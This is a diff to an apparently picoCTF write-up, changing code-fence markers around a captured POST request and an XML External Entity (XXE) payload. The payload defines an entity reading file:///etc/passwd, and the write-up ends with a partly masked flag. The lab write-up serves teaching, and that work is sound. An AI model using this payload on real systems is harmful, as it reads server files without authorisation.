@@ -180,7 +180,7 @@ Upon opening the we portal one can easily see that there are only 3 buttons, tha
 Using Burp it is possible to see that a post request gets sent when clicking on a "detail" button.
 The request is formatted in the following manner: 
 
-'''
+**
 POST /data HTTP/1.1
 Host: saturn.picoctf.net:52302
 Content-Length: 61
@@ -199,12 +199,12 @@ Connection: close
       1
     </ID>
   </data>
-'''
+**
 
 We can try to forge a post request with an XML External Entity attack (XXE or XEE).
 The post request data should be the following:
 
-'''
+**
 <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
   <data>
@@ -212,6 +212,6 @@ The post request data should be the following:
       &ext;
     </ID>
   </data>
-'''
+**
 
 ### picoCTF{XML_3xtern@l_3nt1t1ty_XXXXXXXX}
